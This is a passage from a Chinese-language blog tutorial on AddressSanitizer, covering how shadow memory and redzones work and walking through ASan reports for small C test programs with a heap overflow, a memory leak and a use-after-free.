</span>in main memory. These <span class="hljs-keyword">shadow </span><span class="hljs-keyword">bytes </span>are typically invisible to the <span class="hljs-keyword">original </span>program <span class="hljs-keyword">and </span>are used to record information about the <span class="hljs-keyword">original </span>piece of data. --维基百科<br></code></pre></td></tr></table></figure><p>简而言之，shadow memory 是用来记录当前进程内存的可访问状态的元数据。<br>本ASAN应用中，利用 shadow memory 的映射，知道当前内存的可访问状态。<br>例如有一块内存M1，其 shadow memory 是S1，当我们需要访问M1时，会先读取S1，若S1记录值允许访问，才可访问。不难发现，如果应用 shadow memory，则需要为其单独分配空间来储存状态量。<br><strong>更高效的映射方法</strong><br>ASAN使用了一种更高效的映射方法，可以将一块 8Byte 的内存块用 1Byte 的内存表示。<br>因为 malloc 函数返回地址（分配地址）是 8Byte 对齐的，故一块内存可以进行寻址访问的状态便有以下9种：</p><ul><li>整块内存（8Byte）均无法访问；</li><li>整块内存（8Byte）均可访问；</li><li>仅内存的前k字节可访问（k从1~7之间取值）。</li></ul><p>那么一块内存的访问状态，便可以用 1Byte 大小的空间进行表示，甚至完全不需要 1Byte。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">什么是 <span class="hljs-number">8</span><span class="hljs-keyword">Byte</span> 对齐？<br><br>当使用 malloc 函数分配空间时，比如<br><span class="hljs-keyword">void</span> *p1 = malloc(<span class="hljs-number">1</span>);<br>我申请了<span class="hljs-number">1</span>个字节大小的内存，但 malloc 函数会分配给我<span class="hljs-number">8</span>个字节的连续的一块内存。<br>这就是 <span class="hljs-number">8</span><span class="hljs-keyword">byte</span> 对齐<br><br>为什么是<span class="hljs-number">9</span>个状态？<br><br>首先，如果该内存块未被分配，即全部无法访问，对应一种；<br>如果该内存块全部被分配，则全部可以访问，对应一种；<br>由于内存块是连续分配的，故不可能出现 连续的 <span class="hljs-number">8</span><span class="hljs-keyword">Byte</span> 内，第<span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span> <span class="hljs-keyword">Byte</span> 可访问，第 <span class="hljs-number">4</span> <span class="hljs-keyword">Byte</span>不可访问，而第 <span class="hljs-number">5</span> <span class="hljs-keyword">Byte</span> 又可以访问的情况，故对应了<span class="hljs-number">7</span>种情况，即该块内，前k个 <span class="hljs-keyword">Byte</span> 可访问，而后 <span class="hljs-number">8</span> - k <span class="hljs-keyword">Byte</span>无法访问。共对应 <span class="hljs-number">7</span> 种情况。<br>故一共是 <span class="hljs-number">1</span> + <span class="hljs-number">1</span> + <span class="hljs-number">7</span> = <span class="hljs-number">9</span> 种状态。<br><br></code></pre></td></tr></table></figure><p><strong>Shadow Memory 对应算法</strong><br>即如何将 Memory 的内容映射至 Shadow 呢<br>使用以下公式，其中 ADDR 表示当前内存块的地址：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">(<span class="hljs-keyword">ADDR</span> &gt;&gt; <span class="hljs-number">3</span>) + OFFSET<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>即右移三位后，统一加上一个偏移值 OFFSET 避免与正常允许的内存产生冲突。</p><p><strong>Shadow Memory 中存放的值</strong><br>规则如下：</p><ul><li>当该 Shadow Memory 值为0时，表示该内存块所有地址均可寻址；</li><li>值为1~7的整数时，表示前k个地址可寻址；</li><li>值为任意负数时，表示不可寻址；<br>且<strong>不同的负数</strong>表示不同的不可寻址：heap redzones， stack redzones, global redzones, freed redzones)</li></ul><h2 id="判断是否访问了不能访问的内存"><a href="#判断是否访问了不能访问的内存" class="headerlink" title="判断是否访问了不能访问的内存"></a>判断是否访问了不能访问的内存</h2><p>首先，当 AccessSize 也就是访问的位数等于8时</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">ShadowAddr </span>= (<span class="hljs-keyword">Addr </span>&gt;&gt; <span class="hljs-number">3</span>) + Offset;<br>if(*<span class="hljs-keyword">ShadowAddr </span>!= <span class="hljs-number">0</span>)<br>   ReportAndCrash(<span class="hljs-keyword">Addr);</span><br><span class="hljs-keyword"></span>   <br></code></pre></td></tr></table></figure><p>当 AccessSize 为 1 、 2 、 4时，需要将Addr带入，与7做AND操作后，进行判断</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">ShadowAddr = (<span class="hljs-name">Addr</span> &gt;&gt; <span class="hljs-number">3</span>) + Offset<span class="hljs-comment">;</span><br>k = *ShadowAddr<span class="hljs-comment">;</span><br>if ( <span class="hljs-name">k</span> != <span class="hljs-number">0</span> <span class="hljs-symbol">&amp;&amp;</span> ((<span class="hljs-name">Addr</span> &amp; <span class="hljs-number">7</span> ) + AccessSize &gt; k))<br>     ReportAndCrash(<span class="hljs-name">Addr</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>为何此处是 <code>Addr &amp; 7 + AccessSize</code>与 k（可访问字节数）做比较呢<br>因为 Addr &amp; 7 代表被访问的该内存（这一Byte），相对其之前一个“对齐点”的位移，加上妄图访问的字节数后，就是最终访问的总字节数，用其与 k 比大小，可判断是否越界。</p><p><strong>关于代码插桩何时介入</strong><br>放到LLVM优化的靠后位置，这样只需要对被LLVM进行过优化的代码进行插桩，减少了不必要的插入。<br>该报错代码 <code>ReportAndCrash</code> 只会执行一次就中断程序。</p><p><strong>运行时</strong>：<br>调用 malloc 函数会返回一段内存，和两端额外的内存，延申在原本申请的内存两端，这被称为<code> redzone</code>或称为 <code>poisoned</code>，分配的 <code> red zone</code> 越大，找到溢出漏洞的概率越大。<br>设置redzone将分配的内存段包住，有以下关系：<br>当分配的内存段数量为 n 时， redzones 的数量应该是 n+1 </p><p>free 函数会将释放区域全部设置为 poisoned 且不会恢复，即该区域暂时不会再次被 malloc。这被叫做拖入隔离区，隔离区是一个大小固定的 FIFO 队列。默认情况下，malloc和free会记录当前的调用栈以为bug报告提供更多信息</p><p><strong>栈及全局对象的检测</strong></p><p>对于全局对象，redzones 是在编译时被放入的，随后在程序运行时，这些地址被传入<code> runtime library</code>。程序运行时，这些 redzones 会被 标记为 <code>poisoned</code></p><p>对于栈来说，redzones 的创建与染毒，是都在 runtime 发生的。</p><p><strong>错误及漏报</strong><br>比较具代表性的：<br>直接跨越了一个 redzone<br>即 a 分配了 500字节，a 右侧 redzone 大小为500 字节，b分配了 5000字节大小<br>若一个指针从 a 读取，偏移量达到1000，则很可能直接访问了b区的合法区域。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *a = new <span class="hljs-type">char</span>[<span class="hljs-number">100</span>];<br><br><span class="hljs-type">char</span> *b = new <span class="hljs-type">char</span>[<span class="hljs-number">1000</span>];<br><br>a[<span class="hljs-number">500</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// may end up somewhere in b</span><br></code></pre></td></tr></table></figure><h1 id="ASan-实际测试"><a href="#ASan-实际测试" class="headerlink" title="ASan 实际测试"></a>ASan 实际测试</h1><h2 id="堆越界"><a href="#堆越界" class="headerlink" title="堆越界"></a>堆越界</h2><p>程序源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">char</span> *heap_buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">32</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>));<br>        <span class="hljs-built_in">memcpy</span>(heap_buf+<span class="hljs-number">30</span>, <span class="hljs-string">&quot;overflow&quot;</span>, <span class="hljs-number">8</span>);    <span class="hljs-comment">//在heap_buf的第30个字节开始，拷贝8个字符</span><br><br>        <span class="hljs-built_in">free</span>(heap_buf);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出，申请了32个字节，但是会访问至 base_addr + 37 字节处，来看看 asan 怎么处理</p><p>编译：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-fsanitizer</span>=addresss -fno-omit-frame-pointer -o test1 test1.c<br></code></pre></td></tr></table></figure><p>运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./test1<br></code></pre></td></tr></table></figure><p>以下是运行结果，即asan给出的错误信息</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs tap">=================================================================<br>==3905==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000000060 at pc 0x7f09040c62c3 bp 0x7ffcf197b180 sp 0x7ffcf197a928<br>WRITE of size<span class="hljs-number"> 8 </span>at 0x603000000060 thread T0<br>    <span class="hljs-comment">#0 0x7f09040c62c2 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827</span><br>    <span class="hljs-comment">#1 0x5605f809b241 in main (/home/stre/Desktop/test1+0x1241)</span><br>    <span class="hljs-comment">#2 0x7f0903e91fcf in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span><br>    <span class="hljs-comment">#3 0x7f0903e9207c in __libc_start_main_impl ../csu/libc-start.c:409</span><br>    <span class="hljs-comment">#4 0x5605f809b144 in _start (/home/stre/Desktop/test1+0x1144)</span><br><br>0x603000000060 is located<span class="hljs-number"> 0 </span>bytes to the right of 32-byte region [0x603000000040,0x603000000060)<br>allocated by thread T0 here:<br>    <span class="hljs-comment">#0 0x7f0904140867 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145</span><br>    <span class="hljs-comment">#1 0x5605f809b21e in main (/home/stre/Desktop/test1+0x121e)</span><br>    <span class="hljs-comment">#2 0x7f0903e91fcf in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span><br><br>SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 in __interceptor_memcpy<br>Shadow bytes around the buggy address:<br>  0x0c067fff7fb0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7fc0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7fd0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7fe0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7ff0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>=&gt;0x0c067fff8000: fa fa<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>fa fa fa<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00[fa]fa fa fa<br>  0x0c067fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>Shadow byte legend (one shadow byte represents<span class="hljs-number"> 8 </span>application bytes):<br>  Addressable:           00<br>  Partially addressable:<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span><br>  Heap left redzone:       fa<br>  Freed heap region:       fd<br>  Stack left redzone:      f1<br>  Stack mid redzone:       f2<br>  Stack right redzone:     f3<br>  Stack after return:      f5<br>  Stack use after scope:   f8<br>  Global redzone:          f9<br>  Global init order:       f6<br>  Poisoned by user:        f7<br>  Container overflow:      fc<br>  Array cookie:            ac<br>  Intra object redzone:    bb<br>  ASan internal:           fe<br>  Left alloca redzone:     ca<br>  Right alloca redzone:    cb<br>  Shadow gap:              cc<br>==3905==ABORTING<br></code></pre></td></tr></table></figure><p>其中：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">==<span class="hljs-number">3905</span>==ERROR: <span class="hljs-keyword">AddressSanitizer: </span>heap-<span class="hljs-keyword">buffer-overflow </span>on <span class="hljs-keyword">address </span><span class="hljs-number">0x603000000060</span> <span class="hljs-built_in">at</span> pc <span class="hljs-number">0x7f09040c62c3</span> <span class="hljs-keyword">bp </span><span class="hljs-number">0x7ffcf197b180</span> <span class="hljs-built_in">sp</span> <span class="hljs-number">0x7ffcf197a928</span><br>WRITE of size <span class="hljs-number">8</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x603000000060</span> thread <span class="hljs-built_in">T0</span><br></code></pre></td></tr></table></figure><p>这两行内容告诉用户，这是一个堆越界的 bug ，发生于地址 <code>0x603000000060</code> 处</p><p>接下来：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">0x603000000060</span> is located <span class="hljs-number">0</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> <span class="hljs-keyword">of</span> <span class="hljs-number">32</span>-<span class="hljs-keyword">byte</span> region [<span class="hljs-number">0x603000000040</span>,<span class="hljs-number">0x603000000060</span>)<br></code></pre></td></tr></table></figure><p>意思是，这个错误访问的地址，是 <code>32-byte region</code>的右侧，位于 <code>[0x603000000040,0x603000000060)</code>这个左闭右开的可访问区间的右端，位移为0处，即访问了右侧这个不可访问的地址。</p><p>接下来：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">SUMMARY: AddressSanitizer: heap-buffer-overflow ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>sanitizer_common/sanitizer_common_interceptors.inc:<span class="hljs-number">827</span> <span class="hljs-keyword">in</span> __interceptor_memcpy<br></code></pre></td></tr></table></figure><p>总结：这是一个堆越界的错误，具体路径以及导致这个问题的函数被列出。</p><p>利用 shadow memory 的映射公式，可以计算</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x603000000060</span> &gt;&gt; <span class="hljs-number">3</span> + <span class="hljs-number">0</span>x7fff8000 = <span class="hljs-number">0</span>xc067fff800c<br></code></pre></td></tr></table></figure><p>而这个计算出的地址，正好对应下面列出的特别被圈出的地址</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">0x0c067fff7fe0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7ff0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>=&gt;0x0c067fff8000: fa fa<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>fa fa fa<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00[fa]fa fa fa<br>  0x0c067fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br></code></pre></td></tr></table></figure><p>即，该影子地址内存储的值为fa，即不可访问，但源程序进行了访问，故报错。</p><p>修改源代码，若仅前3个字节（即共32+3个字节是申请的内存空间）可访问，则此处报错是如何</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">  <span class="hljs-number">0</span>x0c087fff7<span class="hljs-symbol">ff0:</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>=&gt;<span class="hljs-number">0</span>x0c087f<span class="hljs-symbol">ff8000:</span> fa fa <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>[<span class="hljs-number">03</span>]fa fa fa fa fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c087f<span class="hljs-symbol">ff8010:</span> fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br></code></pre></td></tr></table></figure><p>很明显，此处存放的值为03，即前三个字节可访问</p><h2 id="内存泄露检测"><a href="#内存泄露检测" class="headerlink" title="内存泄露检测"></a>内存泄露检测</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// leak.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">char</span> *s = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">strcpy</span>(s, <span class="hljs-string">&quot;Hello world!&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;string is: %s\n&quot;</span>, s);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进行编译、运行后，会生成下述报告</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">==<span class="hljs-number">3528</span>==ERROR: LeakSanitizer: detected memory leaks<br><br>Direct leak of <span class="hljs-number">100</span> <span class="hljs-keyword">byte</span>(s) in <span class="hljs-number">1</span> object(s) allocated <span class="hljs-keyword">from</span>:<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0</span>x7fa9f49d0867 in __interceptor_malloc ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>asan/asan_malloc_linux.cpp:<span class="hljs-number">145</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0</span>x55df42973225 in main (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/</span>leak+<span class="hljs-number">0</span>x1225)<br>    #<span class="hljs-number">2</span> <span class="hljs-number">0</span>x7fa9f4721fcf in __libc_start_call_main ..<span class="hljs-regexp">/sysdeps/</span>nptl/libc_start_call_main.h:<span class="hljs-number">58</span><br><br>SUMMARY: AddressSanitizer: <span class="hljs-number">100</span> <span class="hljs-keyword">byte</span>(s) leaked in <span class="hljs-number">1</span> allocation(s).<br></code></pre></td></tr></table></figure><p>发现内存泄露<code>detected memory leaks</code><br>接下来打印了泄露的位置以及泄露空间的大小</p><h2 id="UAF（use-after-free）"><a href="#UAF（use-after-free）" class="headerlink" title="UAF（use after free）"></a>UAF（use after free）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// uaf.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">char</span> *s = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">free</span>(s);<br>    <span class="hljs-built_in">strcpy</span>(s, <span class="hljs-string">&quot;Hello world!&quot;</span>);  <span class="hljs-comment">// use-after-free</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;string is: %s\n&quot;</span>, s);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>将指针 s 指向的空间释放后，又访问指向的空间。</p><p>以下是编译且运行后报错</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs gradle">=================================================================<br>==<span class="hljs-number">3573</span>==ERROR: AddressSanitizer: heap-use-after-free on address <span class="hljs-number">0</span>x60b0000000f0 at pc <span class="hljs-number">0</span>x7fa6785892c3 bp <span class="hljs-number">0</span>x7fff93446ed0 sp <span class="hljs-number">0</span>x7fff93446678<br><span class="hljs-keyword">WRITE</span> of <span class="hljs-keyword">size</span> <span class="hljs-number">13</span> at <span class="hljs-number">0</span>x60b0000000f0 thread T0<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0</span>x7fa6785892c2 in __interceptor_memcpy ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>sanitizer_common/sanitizer_common_interceptors.inc:<span class="hljs-number">827</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0</span>x5634c5025270 in main (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/u</span>af+<span class="hljs-number">0</span>x1270)<br>    #<span class="hljs-number">2</span> <span class="hljs-number">0</span>x7fa678354fcf in __libc_start_call_main ..<span class="hljs-regexp">/sysdeps/</span>nptl/libc_start_call_main.h:<span class="hljs-number">58</span><br>    #<span class="hljs-number">3</span> <span class="hljs-number">0</span>x7fa67835507c in __libc_start_main_impl ..<span class="hljs-regexp">/csu/</span>libc-start.c:<span class="hljs-number">409</span><br>    #<span class="hljs-number">4</span> <span class="hljs-number">0</span>x5634c5025164 in _start (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/u</span>af+<span class="hljs-number">0</span>x1164)<br><br><span class="hljs-number">0</span>x60b0000000f0 is located <span class="hljs-number">0</span> bytes inside of <span class="hljs-number">100</span>-<span class="hljs-keyword">byte</span> region [<span class="hljs-number">0</span>x60b0000000f0,<span class="hljs-number">0</span>x60b000000154)<br>freed by thread T0 here:<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0</span>x7fa678603517 in __interceptor_free ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>asan/asan_malloc_linux.cpp:<span class="hljs-number">127</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0</span>x5634c5025255 in main (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/u</span>af+<span class="hljs-number">0</span>x1255)<br>    #<span class="hljs-number">2</span> <span class="hljs-number">0</span>x7fa678354fcf in __libc_start_call_main ..<span class="hljs-regexp">/sysdeps/</span>nptl/libc_start_call_main.h:<span class="hljs-number">58</span><br><br>previously allocated by thread T0 here:<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0</span>x7fa678603867 in __interceptor_malloc ..<span 